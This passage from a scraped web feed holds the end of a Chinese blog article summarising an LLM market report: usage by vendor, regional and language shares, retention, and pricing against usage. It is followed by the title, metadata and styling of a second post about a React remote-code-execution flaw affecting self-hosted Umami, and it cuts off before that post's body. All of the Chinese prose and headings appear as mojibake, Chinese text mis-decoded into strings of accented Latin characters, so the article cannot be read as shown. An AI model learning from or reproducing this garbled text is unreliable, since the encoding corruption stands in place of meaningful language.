<li><strong>Qwen (é€šä¹‰åƒé—®)</strong> ç”»åƒæ›´åƒ Anthropicï¼Œ<strong>40%-60%</strong> çš„æµé‡éƒ½æ˜¯<strong>ç¼–ç¨‹ä»»åŠ¡</strong>ï¼Œæ˜¾ç¤ºå…¶åœ¨æŠ€æœ¯å¼€å‘ç¾¤ä½“ä¸­æœ‰å¾ˆå¼ºçš„æ¸—é€ç‡ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8ceab34eb5a47789864add2879e3dfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=TDOBSQm2FFsZeQh0uh5F1ZzhWSQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>Google æ¨¡å‹çš„ç”¨é€”æœ€æ‚ã€æœ€å®½æ³›ã€‚å®ƒæ¶µç›–äº†æ³•å¾‹ã€ç§‘å­¦ã€ç¿»è¯‘ç­‰å„ç§é•¿å°¾éœ€æ±‚ï¼Œæ›´åƒæ˜¯ä¸€ä¸ª<strong>ç»¼åˆä¿¡æ¯å¼•æ“</strong>ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒGoogle çš„ç¼–ç¨‹ä»½é¢åè€Œåœ¨ä¸‹é™ï¼ˆè·Œè‡³çº¦ 18%ï¼‰ï¼Œè¯´æ˜ç”¨æˆ·æ›´å€¾å‘äºç”¨å®ƒæŸ¥èµ„æ–™è€Œéå†™ä»£ç ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f533afe2bab749779c468a49307bb8b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=4ccFlu4cxLeDv7FTip6wtdZoXxI%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>OpenAI ä¸ xAIï¼šæ­£åœ¨è½¬å‹â€</strong>
<ul>
<li><strong>OpenAI</strong> æ­£åœ¨ä»æ—©æœŸçš„â€œç§‘å­¦é—®ç­”â€å‘â€œå®å¹²â€è½¬å‹ï¼Œç›®å‰ç¼–ç¨‹å’ŒæŠ€æœ¯ä»»åŠ¡å·²å åŠå£æ±Ÿå±±ï¼Œä»‹äº Claude çš„ä¸“ç²¾å’Œ Google çš„åšå­¦ä¹‹é—´ã€‚</li>
<li><strong>xAI</strong> åˆ™ç»å†äº†ä¸€æ¬¡æœ‰è¶£çš„çªå˜ï¼šåŸæœ¬æ˜¯çº¯ç²¹çš„ä»£ç å·¥å…·ï¼ˆç¼–ç¨‹å æ¯”æ›¾è¶… 80%ï¼‰ï¼Œä½†éšç€å…è´¹æ¶ˆè´¹çº§åº”ç”¨çš„æ¨å¹¿ï¼ŒæŠ€æœ¯ã€è§’è‰²æ‰®æ¼”å’Œå­¦æœ¯ç±»æµé‡çªç„¶æ¶Œå…¥ï¼Œç”¨æˆ·ç¾¤æ­£åœ¨ä»çº¯æå®¢å‘å¤§ä¼—æ³›åŒ–ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>æ•°æ®è¯æ˜ï¼Œç›®å‰çš„å¸‚åœºå·²ç»é«˜åº¦åˆ†åŒ–ã€‚ç”¨æˆ·éå¸¸èªæ˜ï¼Œä¼šæ ¹æ®ä»»åŠ¡é€‰æ¨¡å‹ï¼šå†™ä»£ç æ‰¾ Claude/Qwenï¼ŒèŠå¤©æ‰¾ DeepSeekï¼ŒæŸ¥èµ„æ–™æ‰¾ Googleã€‚è¿™å¯¹å¼€å‘è€…æ„å‘³ç€ï¼Œæœªæ¥ä¸å†æ˜¯å•ä¸€æ¨¡å‹çš„å¤©ä¸‹ï¼Œè€Œæ˜¯ <strong>å¤šæ¨¡å‹åä½œ</strong> çš„æ—¶ä»£ã€‚</p>
</blockquote>
<h2 data-id="heading-10">åä¸€ã€LLM å…¨çƒå¸‚åœºçš„åŒºåŸŸä»½é¢ä¸è¯­è¨€åˆ†å¸ƒ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5048598f12446f58778da667079174f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=gQ9PTnQc8Kryy17ZLaBeAZBrA6o%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>åŒ—ç¾ä¸å†â€œä¸€å®¶ç‹¬å¤§â€ï¼Œäºšæ´²æ¶ˆè´¹åŠ›ç¿»å€</strong>
è™½ç„¶åŒ—ç¾ä¾ç„¶æ˜¯å…¨çƒæœ€å¤§çš„ AI æ¶ˆè´¹å¸‚åœºï¼ˆçº¦å  47%ï¼‰ï¼Œä½†å…¶ä»½é¢å·²ä¸è¶³å…¨çƒæ€»æ”¯å‡ºçš„ä¸€åŠã€‚æœ€å¼•äººæ³¨ç›®çš„æ˜¯<strong>äºšæ´²çš„å´›èµ·</strong>ï¼šäºšæ´²ä¸ä»…æ˜¯æ¨¡å‹çš„ç”Ÿäº§åœ°ï¼Œæ›´æ˜¯è¿…çŒ›å¢é•¿çš„æ¶ˆè´¹åœ°ï¼Œå…¶å¸‚åœºä»½é¢ä»æœ€åˆçš„ 13% é£™å‡è‡³ <strong>31%</strong>ï¼Œå®ç°äº†ç¿»å€å¢é•¿ã€‚</p>
</li>
<li>
<p><strong>æ–°åŠ å¡æˆâ€œæ„å¤–é»‘é©¬â€</strong>
åœ¨å…·ä½“å›½å®¶çš„æµé‡æ’åä¸­ï¼Œå‡ºç°äº†ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼š<strong>æ–°åŠ å¡</strong>ä»¥ 9.21% çš„ä»½é¢è¶…è¶Šäº†å¾·å›½ï¼ˆ7.51%ï¼‰å’Œä¸­å›½ï¼ˆ6.01%ï¼‰ï¼Œé«˜å±…<strong>å…¨çƒç¬¬äºŒ</strong>ï¼Œä»…æ¬¡äºç¾å›½ã€‚è¿™å¯èƒ½åæ˜ äº†å…¶ä½œä¸ºåŒºåŸŸæ•°æ®ä¸­å¿ƒæ¢çº½æˆ–é«˜ç§‘æŠ€ä¼ä¸šèšé›†åœ°çš„ç‰¹æ®Šåœ°ä½ã€‚</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/093badd0053847b89904f2e9292ec399~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=hiboZpF7HusUeYCQNCFJQ31hvQQ%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>è‹±è¯­ç»å¯¹ä¸»å¯¼ï¼Œä¸­æ–‡ç¨³å±…ç¬¬äºŒ</strong>
åœ¨è¯­è¨€åˆ†å¸ƒä¸Šï¼Œè‹±è¯­ä¾ç„¶å…·æœ‰å‹å€’æ€§ä¼˜åŠ¿ï¼Œå æ®äº†è¶…è¿‡ <strong>80%</strong> çš„ Token æµé‡ã€‚<strong>ç®€ä½“ä¸­æ–‡</strong>ä»¥çº¦ 5% çš„ä»½é¢ä½å±…ç¬¬äºŒï¼Œè¿™ä¸»è¦å¾—ç›Šäº DeepSeekã€Qwen ç­‰å›½äº§å¼€æºæ¨¡å‹çš„å¹¿æ³›åº”ç”¨ã€‚å…¶ä½™å¦‚ä¿„è¯­ã€è¥¿ç­ç‰™è¯­ç­‰è™½ç„¶å æ¯”ä¸é«˜ï¼Œä½†ä¹Ÿæ„æˆäº†é‡è¦çš„é•¿å°¾å¸‚åœºã€‚</li>
</ul>
<blockquote>
<p>å¯¹äºæ¨¡å‹å‚å•†å’ŒåŸºç¡€è®¾æ–½è¿è¥å•†æ¥è¯´ï¼Œä»…å…³æ³¨å•ä¸€å¸‚åœºå·²ä¸å¤Ÿã€‚é¢å¯¹è¿™ç§å…¨çƒåŒ–ä½†åˆé«˜åº¦æœ¬åœ°åŒ–ï¼ˆä¸åŒè¯­è¨€ã€ä¸åŒåˆè§„è¦æ±‚ï¼‰çš„ä½¿ç”¨ä¹ æƒ¯ï¼Œ<strong>è·¨åŒºåŸŸçš„æœåŠ¡èƒ½åŠ›</strong>å·²æˆä¸ºç«äº‰çš„åŸºæœ¬é—¨æ§›ã€‚</p>
</blockquote>
<h2 data-id="heading-11">åäºŒã€ç”¨æˆ·ç•™å­˜ï¼šä»â€œå°é²œâ€åˆ°â€œä¾èµ–â€</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae4b278bb09e47b19521d8e12590024f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=Q0OyUKT1zAL49f2pZLcJ9gn0GRA%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>åªæœ‰è§£å†³ç—›ç‚¹ï¼Œæ‰èƒ½â€œé”æ­»â€ç”¨æˆ·</strong>
æ•°æ®æ­ç¤ºäº†ä¸€ä¸ªæ®‹é…·çš„è§„å¾‹ï¼šç”¨æˆ·ä¸ä»…ä»…æ˜¯æ¥â€œç©ç©â€çš„ã€‚åªæœ‰å½“ä¸€ä¸ªæ–°æ¨¡å‹å®Œç¾è§£å†³äº†ç”¨æˆ·ä¹‹å‰è§£å†³ä¸äº†çš„å…·ä½“éš¾é¢˜ï¼ˆæ— è®ºæ˜¯æŠ€æœ¯çªç ´è¿˜æ˜¯æˆæœ¬æä½ï¼‰ï¼Œç”¨æˆ·æ‰ä¼šçœŸæ­£é•¿æœŸç•™ä¸‹æ¥ã€‚ä¸€æ—¦ä¸šåŠ¡è·‘é€šï¼Œç”¨æˆ·ä¸ºäº†ç¨³å®šï¼ŒåŸºæœ¬ä¸ä¼šå†æ¢æ¨¡å‹ã€‚</p>
</li>
<li>
<p><strong>å…ˆå‘ä¼˜åŠ¿å°±æ˜¯ä¸€åˆ‡</strong>
çœŸæ­£å¿ è¯šçš„ç”¨æˆ·ï¼Œå¾€å¾€æ˜¯æ¨¡å‹åˆšå‘å¸ƒæ—¶æœ€æ—©è¿›æ¥çš„é‚£ä¸€æ‰¹ã€‚å› ä¸ºæ¨¡å‹æœ€æ—©å¸®è¿™æ‰¹äººè§£å†³äº†é—®é¢˜ï¼Œä»–ä»¬æŠŠç³»ç»Ÿå’Œä»£ç éƒ½åŸºäºè¿™ä¸ªæ¨¡å‹æ­å¥½äº†ï¼Œè¿ç§»æˆæœ¬å¾ˆé«˜ã€‚åæ¥çš„æ¨¡å‹å³ä½¿æ€§èƒ½å·®ä¸å¤šï¼Œä¹Ÿå¾ˆéš¾å†æŠŠè¿™æ‰¹äººæŠ¢èµ°ã€‚</p>
</li>
<li>
<p><strong>å¹³åº¸çš„æ¨¡å‹ç•™ä¸ä½äºº</strong>
å¦‚æœä¸€ä¸ªæ¨¡å‹å‘å¸ƒæ—¶åªæ˜¯â€œè¿˜è¡Œâ€ã€â€œå¤Ÿç”¨â€ï¼Œè€Œæ²¡æœ‰åœ¨æŸä¸€æ–¹é¢åšåˆ°é¡¶å°–ï¼ˆæ¯”å¦‚ Gemini 2.0 Flash å’Œ Llama 4ï¼‰ï¼Œç»“æœå°±æ˜¯ç¾éš¾æ€§çš„ï¼šç”¨æˆ·è¯•ä¸€ä¸‹å°±å…¨è·‘äº†ï¼Œå®Œå…¨æ— æ³•å½¢æˆç¨³å®šçš„æ ¸å¿ƒç”¨æˆ·ç¾¤ã€‚</p>
</li>
<li>
<p><strong>DeepSeek çš„â€œå›å¤´å®¢â€ç°è±¡</strong>
DeepSeek æœ‰ä¸ªéå¸¸ç‹¬ç‰¹çš„æ•°æ®ç‰¹å¾ï¼šå¾ˆå¤šç”¨æˆ·ä¸€å¼€å§‹æµå¤±äº†ï¼Œä½†è¿‡äº†ä¸€ä¸¤ä¸ªæœˆåˆå›æ¥äº†ã€‚è¿™è¯´æ˜ç”¨æˆ·åœ¨å¯¹æ¯”äº†ä¸€åœˆå…¶ä»–ç«å“åï¼Œå‘ç° DeepSeek åœ¨æ€§ä»·æ¯”æˆ–ç‰¹å®šèƒ½åŠ›ä¸Šä¾ç„¶æ˜¯å¸‚é¢ä¸Šæœ€å¥½çš„é€‰æ‹©ï¼Œåªèƒ½ä¹–ä¹–å›æ¥ç»§ç»­ç”¨ã€‚</p>
</li>
</ul>
<h2 data-id="heading-12">åä¸‰ã€å„ç±» AI ä»»åŠ¡çš„æˆæœ¬ä¸ç”¨é‡åˆ†å¸ƒ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51f7f255e7b14a2c9bd8f173837f4b85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=ahghZfolGfnVzOMPN62H1pdiOy0%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>ç¼–ç¨‹å’Œè§’è‰²æ‰®æ¼”ï¼šé‡å¤§ä¸”ä¾¿å®œ</strong>
è¿™æ˜¯ç›®å‰ AI æœ€å¤§çš„ä¸¤ä¸ªæµé‡æ± ã€‚å®ƒä»¬çš„ç‰¹ç‚¹æ˜¯ï¼š<strong>æ€»ä½¿ç”¨é‡å·¨å¤§ï¼Œä½†å¹³å‡å•ä»·å¾ˆä½</strong>ï¼ˆé€šå¸¸ä½äºä¸­ä½æ•° 0.73 ç¾å…ƒ/ç™¾ä¸‡ tokenï¼‰ã€‚è¿™è¯´æ˜è¿™ä¸¤ä¸ªé¢†åŸŸå·²ç»éå¸¸æˆç†Ÿä¸”æ™®åŠï¼Œç”¨æˆ·å¯¹ä»·æ ¼æ•æ„Ÿï¼Œå€¾å‘äºä½¿ç”¨ç»è¿‡ä¼˜åŒ–çš„ä½æˆæœ¬æ¨¡å‹ï¼ˆæ¯”å¦‚å¼€æºæ¨¡å‹ï¼‰ã€‚</p>
</li>
<li>
<p><strong>â€œæŠ€æœ¯ç±»â€ä»»åŠ¡ï¼šåˆè´µåˆæœ‰äººç”¨</strong>
æ•°æ®ä¸­æœ‰ä¸€ä¸ªéå¸¸æ˜¾çœ¼çš„å¼‚å¸¸å€¼â€”â€”<strong>â€œæŠ€æœ¯ï¼ˆTechnologyï¼‰â€<strong>ç±»ä»»åŠ¡ï¼ˆæŒ‡ç³»ç»Ÿæ¶æ„ã€å¤æ‚æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡ç­‰ï¼‰ã€‚å®ƒçš„</strong>å•ä»·æé«˜</strong>ï¼Œè¿œè¶…å…¶ä»–ç±»åˆ«ï¼Œä½†<strong>ä½¿ç”¨é‡ä¾ç„¶å¾ˆå¤§</strong>ã€‚è¿™è¯´æ˜ç”¨æˆ·ä¸ºäº†è§£å†³å¤æ‚çš„ç¡¬æ ¸æŠ€æœ¯é—®é¢˜ï¼Œéå¸¸æ„¿æ„æ”¯ä»˜é«˜ä»·ã€‚å¯¹æ¨¡å‹å‚å•†æ¥è¯´ï¼Œè¿™æ˜¯åˆ©æ¶¦æœ€ä¸°åšçš„ä¸€å—è‚¥è‚‰ã€‚</p>
</li>
<li>
<p><strong>é‡‘èå’ŒåŒ»ç–—ï¼šä½é¢‘ä½†é«˜ä»·</strong>
é‡‘èã€å­¦æœ¯ã€åŒ»ç–—ç­‰ä¸“ä¸šé¢†åŸŸçš„ç‰¹ç‚¹æ˜¯**â€œç”¨çš„å°‘ï¼Œä½†ç»™é’±å¤šâ€**ã€‚ç”¨æˆ·ä¸ä¼šåƒå†™ä»£ç é‚£æ ·å¤©å¤©é—®ï¼Œä½†å› ä¸ºå¯¹å‡†ç¡®æ€§å’Œä¸“ä¸šåº¦è¦æ±‚æé«˜ï¼Œä¸€æ—¦éœ€è¦ä½¿ç”¨ï¼Œä»–ä»¬æ„¿æ„ä¸ºæ˜‚è´µçš„é«˜ç«¯æ¨¡å‹ä»˜è´¹ã€‚</p>
</li>
<li>
<p><strong>ç¿»è¯‘å’Œæ³•å¾‹ï¼šä½ä»·ä¸”ä½é¢‘</strong>
ç¿»è¯‘ã€æ³•å¾‹å¸¸è¯†å’Œå†·çŸ¥è¯†é—®ç­”å±äº<strong>ä½æˆæœ¬ã€ä½æµé‡</strong>åŒºåŸŸã€‚è¿™è¯´æ˜è¿™ç±»ä»»åŠ¡å·²ç»è¢«â€œå•†å“åŒ–â€äº†ï¼ŒæŠ€æœ¯é—¨æ§›ä¸é«˜ï¼Œç”¨æˆ·è§‰å¾—ç”¨ä¾¿å®œçš„æ¨¡å‹éšä¾¿è·‘è·‘å°±å¤Ÿç”¨äº†ï¼Œä¸éœ€è¦èŠ±å¤§ä»·é’±ã€‚</p>
</li>
</ul>
<h2 data-id="heading-13">åå››ã€ä»·æ ¼ä¸ç”¨é‡çš„å…³ç³»ï¼šä¾¿å®œæœªå¿…æœ‰äººä¹°ï¼Œè´µä¹Ÿæœ‰äººæŠ¢</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b1642582e1342d1946631c14669f758~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=n%2FM8q9JQvLMQohnus%2BSeBm69Tu4%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>é™ä»·æ¢ä¸æ¥é”€é‡</strong>
æ•°æ®æ˜¾ç¤ºï¼Œæ¨¡å‹å¸‚åœºçš„éœ€æ±‚å¯¹ä»·æ ¼éå¸¸ä¸æ•æ„Ÿã€‚æ•´ä½“æ¥çœ‹ï¼Œä»·æ ¼é™ä½ 10%ï¼Œç”¨é‡æ‰å¢åŠ ä¸åˆ° 1%ã€‚è¿™è¯´æ˜å¤§å®¶é€‰æ¨¡å‹ä¸»è¦çœ‹â€œèƒ½ä¸èƒ½å¹²æˆäº‹â€ï¼Œè€Œä¸æ˜¯å•çº¯å›¾ä¾¿å®œã€‚</p>
</li>
<li>
<p><strong>å¸‚åœºåˆ†æˆäº†å››ç±»</strong></p>
<ul>
<li><strong>é«˜ä»·çˆ†æ¬¾ï¼ˆPremium Leadersï¼‰ï¼š</strong> æ¯”å¦‚ <strong>Claude Sonnet</strong> ç³»åˆ—ã€‚è™½ç„¶ä»·æ ¼ä¸è²ï¼ˆçº¦ $2/ç™¾ä¸‡ tokenï¼‰ï¼Œä½†ç”¨é‡å·¨å¤§ã€‚è¯´æ˜åªè¦æ¨¡å‹è¶³å¤Ÿå¥½ã€è¶³å¤Ÿç¨³ï¼Œç”¨æˆ·æ˜¯æ„¿æ„æé’±çš„ã€‚</li>
<li><strong>æ€§ä»·æ¯”å·¨å¤´ï¼ˆEfficient Giantsï¼‰ï¼š</strong> æ¯”å¦‚ <strong>DeepSeek V3</strong> å’Œ <strong>Gemini Flash</strong>ã€‚ä»·æ ¼ä¾¿å®œï¼ˆä¸åˆ° $0.4ï¼‰ä¸”èƒ½åŠ›å¼ºï¼Œæ˜¯ç›®å‰è·‘å¤§æ‰¹é‡ä»»åŠ¡çš„é»˜è®¤é¦–é€‰ã€‚</li>
<li><strong>é¡¶çº§ä¸“å®¶ï¼ˆPremium Specialistsï¼‰ï¼š</strong> æ¯”å¦‚ <strong>GPT-5 Pro</strong>ã€‚æè´µï¼ˆçº¦ $35ï¼‰ï¼Œç”¨é‡ä¸å¤§ã€‚åªæœ‰åœ¨å¤„ç†æœ€éš¾ã€æœ€å…³é”®ã€ç»å¯¹ä¸èƒ½å‡ºé”™çš„ä»»åŠ¡æ—¶ï¼Œå¤§å®¶æ‰èˆå¾—ç”¨å®ƒã€‚</li>
<li><strong>å»‰ä»·é•¿å°¾ï¼ˆLong Tailï¼‰ï¼š</strong> å¾ˆå¤šå°æ¨¡å‹è™½ç„¶ä¾¿å®œåˆ°å‡ ä¹ç™½é€ï¼Œä½†ä¾ç„¶æ²¡äººç”¨ã€‚å› ä¸ºèƒ½åŠ›ä¸è¡Œæˆ–ä¸å¥½é›†æˆï¼Œå†ä¾¿å®œä¹Ÿæ˜¯æµªè´¹æ—¶é—´ã€‚</li>
</ul>
</li>
<li>
<p><strong>åªæœ‰â€œä¾¿å®œâ€æ˜¯æ²¡ç”¨çš„</strong>
æ•°æ®ç‹ ç‹ æ‰“è„¸äº†â€œä»·æ ¼æˆ˜â€ç­–ç•¥ã€‚å•çº¯æŠŠä»·æ ¼åšåˆ°æä½å¹¶ä¸èƒ½å¸å¼•ç”¨æˆ·ã€‚æ¨¡å‹å¿…é¡»å…ˆè¾¾åˆ°â€œå¥½ç”¨â€çš„åŠæ ¼çº¿ï¼Œä¾¿å®œæ‰æœ‰æ„ä¹‰ã€‚å¦‚æœèƒ½åŠ›ä¸å¤Ÿï¼Œå¼€å‘è€…æ ¹æœ¬ä¸æ•¢æŠŠå®ƒé›†æˆåˆ°äº§å“é‡Œã€‚</p>
</li>
<li>
<p><strong>é—­æºåšâ€œéš¾äº‹â€ï¼Œå¼€æºåšâ€œæ‚äº‹â€</strong>
ç›®å‰å½¢æˆäº†ä¸€ä¸ªæ˜æ˜¾çš„æ ¼å±€ï¼šé—­æºæ¨¡å‹ï¼ˆå¦‚ OpenAI, Anthropicï¼‰è™½ç„¶è´µï¼Œä½†å¤§å®¶ç”¨å®ƒæ¥å¤„ç†é«˜ä»·å€¼ã€é«˜éš¾åº¦çš„æ ¸å¿ƒä»»åŠ¡ï¼›å¼€æºæ¨¡å‹ï¼ˆå¦‚ DeepSeek, Qwenï¼‰å› ä¸ºä¾¿å®œï¼Œå¤§å®¶ç”¨å®ƒæ¥å¤„ç†é‚£äº›å¯¹ç²¾åº¦è¦æ±‚æ²¡é‚£ä¹ˆé«˜ã€ä½†æ•°æ®é‡å·¨å¤§çš„æ—¥å¸¸ä»»åŠ¡ã€‚</p>
</li>
</ul>
<h2 data-id="heading-14">æœ€å</h2>
<p>å…³æ³¨ã€Šcodeç§˜å¯†èŠ±å›­ã€‹ä»æ­¤å­¦ä¹  AI ä¸è¿·è·¯ï¼Œç›¸å…³é“¾æ¥ï¼š</p>
<ul>
<li>æœ¬æŠ¥å‘ŠåŸæ–‡ PDFï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpan.quark.cn%2Fs%2F89788572462d" target="_blank" title="https://pan.quark.cn/s/89788572462d" ref="nofollow noopener noreferrer">pan.quark.cn/s/897885724â€¦</a></li>
<li>AI æ•™ç¨‹å®Œæ•´æ±‡æ€»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwRâ€¦</a></li>
<li>ç›¸å…³å­¦ä¹ èµ„æºæ±‡æ€»åœ¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></li>
</ul>
<p>å¦‚æœæœ¬æœŸå¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œå¸Œæœ›å¾—åˆ°ä¸€ä¸ªå…è´¹çš„ä¸‰è¿ï¼Œæ„Ÿè°¢å¤§å®¶æ”¯æŒ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182]]></title>    <link>https://juejin.cn/post/7581025279645433894</link>    <guid>https://juejin.cn/post/7581025279645433894</guid>    <pubDate>2025-12-08T04:20:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581025279645433894" data-draft-id="7581004702945280027" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182"/> <meta itemprop="keywords" content="å‰ç«¯,å®‰å…¨,React.js"/> <meta itemprop="datePublished" content="2025-12-08T04:20:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cos"/> <meta itemprop="url" content="https://juejin.cn/user/1698115646132254"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React RCE æ¼æ´å½±å“è‡ªå»º Umami æœåŠ¡ â€”â€” è®° CVE-2025-55182
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1698115646132254/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cos
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:20:39.000Z" title="Mon Dec 08 2025 04:20:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body 